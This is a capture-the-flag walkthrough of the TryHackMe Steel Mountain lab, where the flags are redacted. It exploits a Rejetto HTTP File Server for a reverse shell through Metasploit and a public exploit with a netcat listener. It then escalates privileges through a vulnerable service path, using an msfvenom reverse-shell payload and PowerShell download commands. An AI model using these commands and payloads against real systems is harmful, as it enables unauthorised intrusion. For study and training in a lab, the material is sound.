# Steel Mountain

[TOC]

## Introduction

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

## Basic Information

Target IP: 10.10.163.51

## Reconnaissance

Let us start by performing an nmap scan on the target machine in order to know what services it is hosting.

```
export ip=10.10.163.51
nmap $ip
```

> PORT      STATE SERVICE
> 80/tcp    open  http
> 135/tcp   open  msrpc
> 139/tcp   open  netbios-ssn
> 445/tcp   open  microsoft-ds
> 3389/tcp  open  ms-wbt-server
> 8080/tcp  open  http-proxy
> 49152/tcp open  unknown
> 49153/tcp open  unknown
> 49154/tcp open  unknown
> 49155/tcp open  unknown
> 49156/tcp open  unknown
> 49163/tcp open  unknown

We know the host is up and some of its open ports. Let's open the website the target machine is hosting on port 80 to see what we are dealing with.

The website contains a photograph of the employee of the month. Who could this be?

We can easily reverse image search to get the answer ot inspect element and look at the name of the file.

If we inspect the source code the file is stored in *img/billharper.png*.

![image-20230124103401822](./images/image-20230124103401822.png)

Great! Now we can start answering questions!

**Question** Who is the employee of the month?

> Bill Harper

### Initial Access

On top of Port 80, we can clearly see that port 8080 is hosting another website. 

**Question** Scan the machine with nmap. What is the other port running a web server on?

> 8080

If we open it we can see that it's an HTTP File Server called Rejetto.

**Question** Take a look at the other web server. What file server is running?

> Rejetto HTTP File Server

Are there any CVE's that allow us to exploit this file server? Let's find out.

```
searchsploit rejetto http file server 2.3
```

Alternatively we can also search for this vulnerability with exploit-db.com and we can find the CVE ID.

![image-20230124104340529](./images/image-20230124104340529.png)

**Question** What is the CVE number to exploit this file server?

> 2014-628

#### Method 1

Let us see if we have a Metasploit exploit we can take advantage of:

```
msfconsole
search rejetto 2.3
use 0
set rport 8080
set rhosts 10.10.186.87
set lhost 10.8.56.235
exploit
```

Great! We have shell! Let us read the contents of the user.txt flag

```
cat /Users/bill/Desktop/user.txt
```

**Question** Use Metasploit to get an initial shell. What is the user flag?

> <Redacted>

#### Method 2

We can use [this exploit](https://www.exploit-db.com/exploits/39161).

We need three terminals open: 

1. One with a netcat listener to a port of our choice

   ```
   nc -lnvp <PORT>
   ```

2. One with an HTTP server running on port 80 hosting a [nc.exe binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)

   ```
   python3 -m http.server 80
   ```

3. Another to run our exploit

   ```
   python2 exploit.py <TARGET IP> <TARGET PORT>
   ```

The exploit needs to be ran once or twice because on the first iteration the ncat binary is being transfered and on the later ones it is being executed to get a reverse shell. Now we can read the content of the user.txt file as well by using the `type` command.

### Privilege Escalation

Great now that we have initial access we should try and escalate our privileges to root. We already know that THM shows an unquoted service path vulnerability. 

#### Method 1

A Scripts that can help us accomplish this task is the PowerUp.ps1 enumeration script.

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

Inside our meterpreter session we can use **upload** to move this file from our local machine into the target.

```
upload <FILE>
```

Now we just have to enter a powershell command line to execute the file.

```
load powershell
powershell_shell
```

The first command loads the Powershell module for us to use, whereas the second command launches a powershell CLI.

```
.\PowerUp.ps1
Invoke-AllChecks
```

This command let's us know that this service path us unquoted as well as notifying that our user can restart the service.

AdvancedSystemCareService9

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

#### Method 2

We use this to enumerate the machine and understand how we can escalate our privileges.

1. We need to know which service running as SYSTEM is vulnerable (winPeas.exe)
2. Check if we have the necessary privileges to restart said service (accesschk.exe)

Let us download both these files in order to further enumerate our target machine.

https://github.com/carlospolop/PEASS-ng/releases/download/20230122/winPEASx64.exe

https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

```
powershell -c (new-object System.Net.WebClient).DownloadFile(-http://I<P>/winPEASx64.exe','C:\Users\bill\Desktop\winpeas.exe')
powershell -c (new-object System.Net.WebClient).DownloadFile(-http://I<P>/winPEASx64.exe','C:\Users\bill\Desktop\winpeas.exe')
```

> Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
>
> AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
>     File Permissions: bill [WriteData/CreateFiles]
>     Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
>     Advanced SystemCare Service

Great we can see that the service above is vulnerable, now all we have to do is check if we have the necessary privileges to restart it.

```
accesschk.exe /accepteula -ucqv AdvancedSystemCareService9
```

> AdvancedSystemCareService9
>   Medium Mandatory Level (Default) [No-Write-Up]
>   RW NT AUTHORITY\SYSTEM
>         SERVICE_ALL_ACCESS
>   RW BUILTIN\Administrators
>         SERVICE_ALL_ACCESS
>      **S**TEELMOUNTAIN\bill**
>         **SERVICE_PAUSE_CONTINUE**
>         **SERVICE_START**
>         **SERVICE_STOP**
>   R  NT AUTHORITY\INTERACTIVE
>         SERVICE_QUERY_STATUS
>         SERVICE_QUERY_CONFIG
>         SERVICE_INTERROGATE
>         SERVICE_ENUMERATE_DEPENDENTS
>         SERVICE_USER_DEFINED_CONTROL
>         READ_CONTROL
>   R  NT AUTHORITY\SERVICE
>         SERVICE_QUERY_STATUS
>         SERVICE_QUERY_CONFIG
>         SERVICE_INTERROGATE
>         SERVICE_ENUMERATE_DEPENDENTS
>         SERVICE_USER_DEFINED_CONTROL
>         READ_CONTROL

Perfect! We can now abuse this using a msfvenom generated payload called Advanced.exe. We place it in the IObit folder and we restart the service with out listener launched.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
powershell -c (new-object System.Net.WebClient).DownloadFile(-http://I<P>/Advanced.exe','C:\Program Files (x86)\IObit\Advanced.exe')
```

Great! Now all we have to do is restart the service and we get a shell with our listener:

```
nc -lnvp 1234

sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

Great! we can now read the content of the root flag

> <Redacted>
